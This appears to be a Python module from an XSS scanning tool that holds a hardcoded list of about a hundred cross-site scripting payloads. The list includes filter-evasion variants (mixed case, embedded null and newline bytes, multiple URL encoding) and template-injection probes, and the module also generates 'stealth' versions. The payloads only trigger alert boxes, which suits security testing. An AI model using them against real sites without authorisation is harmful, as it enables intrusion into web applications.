import os
import random
from typing import List
from ..utils.http_utils import generate_stealth_payloads

class PayloadManager:
    """Manages XSS payloads for testing, including advanced stealth and evasion payloads."""
    def __init__(self, payloads_file=None):
        self.payloads_file = payloads_file or os.path.join(
            os.path.dirname(__file__), '..', '..', 'data', 'payloads', 'xss_payloads.txt'
        )
        self.payloads = self._load_payloads()
        self.stealth_payloads = self._generate_stealth_payloads()

    def _load_payloads(self) -> List[str]:
        payloads = []
        # Try loading from file
        if os.path.exists(self.payloads_file):
            with open(self.payloads_file, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
        # Add advanced and evasive payloads
        payloads += [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<object data="javascript:alert(\'XSS\')">',
            '<svg><script>alert("XSS")</script></svg>',
            '<math><script>alert("XSS")</script></math>',
            '<details open ontoggle=alert("XSS")>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<embed src="javascript:alert(\'XSS\')">',
            '<marquee onstart=alert("XSS")>',
            '<form autofocus onfocus=alert("XSS")>',
            '<isindex autofocus onfocus=alert("XSS")>',
            'javascript:alert("XSS")',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:alert(/XSS/)',
            '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
            '<scr\x69pt>alert("XSS")</scr\x69pt>',
            '<scr\x00ipt>alert("XSS")</scr\x00ipt>',
            '<scr\x0Aipt>alert("XSS")</scr\x0Aipt>',
            '<scr\x0Dipt>alert("XSS")</scr\x0Dipt>',
            '<SCRIPT>alert("XSS")</SCRIPT>',
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<sCrIpT>alert("XSS")</sCrIpT>',
            '<script\x00>alert("XSS")</script>',
            '<script\x0A>alert("XSS")</script>',
            '<script\x0D>alert("XSS")</script>',
            '%253Cscript%253Ealert("XSS")%253C/script%253E',
            '%25253Cscript%25253Ealert("XSS")%25253C/script%25253E',
            '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
            '<svg><set attributeName=onmouseover to=alert("XSS")>',
            '{{constructor.constructor("alert(\'XSS\')")()}}',
            '{{7*7}}',
            '{{config}}',
            'expression(alert("XSS"))',
            'url(javascript:alert("XSS"))',
            'background:url(javascript:alert("XSS"))',
            'onerror=alert("XSS")',
            'onload=alert("XSS")',
            'onmouseover=alert("XSS")',
            'onfocus=alert("XSS")',
            'oninput=alert("XSS")',
            'onanimationstart=alert("XSS")',
            'oncut=alert("XSS")',
            'oncopy=alert("XSS")',
            'onpaste=alert("XSS")',
            'onpointerdown=alert("XSS")',
            'onpointerup=alert("XSS")',
            'onpointermove=alert("XSS")',
            'onpointerover=alert("XSS")',
            'onpointerout=alert("XSS")',
            'onpointerenter=alert("XSS")',
            'onpointerleave=alert("XSS")',
            'onwheel=alert("XSS")',
            'ontoggle=alert("XSS")',
            'onauxclick=alert("XSS")',
            'onbeforeinput=alert("XSS")',
            'onbeforeunload=alert("XSS")',
            'onhashchange=alert("XSS")',
            'onpageshow=alert("XSS")',
            'onpagehide=alert("XSS")',
            'onpopstate=alert("XSS")',
            'onstorage=alert("XSS")',
            'onunload=alert("XSS")',
            'onafterprint=alert("XSS")',
            'onbeforeprint=alert("XSS")',
            'onmessage=alert("XSS")',
            'onoffline=alert("XSS")',
            'ononline=alert("XSS")',
            'onresize=alert("XSS")',
            'onsearch=alert("XSS")',
            'onselect=alert("XSS")',
            'onshow=alert("XSS")',
            'onsubmit=alert("XSS")',
            'onreset=alert("XSS")',
            'oninvalid=alert("XSS")',
            'oninput=alert("XSS")',
            'onchange=alert("XSS")',
            'onblur=alert("XSS")',
            'onfocus=alert("XSS")',
            'onkeydown=alert("XSS")',
            'onkeypress=alert("XSS")',
            'onkeyup=alert("XSS")',
            'onmousedown=alert("XSS")',
            'onmouseenter=alert("XSS")',
            'onmouseleave=alert("XSS")',
            'onmousemove=alert("XSS")',
            'onmouseout=alert("XSS")',
            'onmouseover=alert("XSS")',
            'onmouseup=alert("XSS")',
            'onmousewheel=alert("XSS")',
            'onwheel=alert("XSS")',
            'oncontextmenu=alert("XSS")',
            'oncopy=alert("XSS")',
            'oncut=alert("XSS")',
            'onpaste=alert("XSS")',
        ]
        return list(set(payloads))

    def _generate_stealth_payloads(self) -> List[str]:
        stealth_payloads = []
        for payload in self.payloads:
            stealth_payloads.extend(generate_stealth_payloads(payload))
        return list(set(stealth_payloads))

    def get_payloads(self, count=10, stealth=True) -> List[str]:
        if stealth:
            return random.sample(self.stealth_payloads, min(count, len(self.stealth_payloads)))
        else:
            return random.sample(self.payloads, min(count, len(self.payloads))) 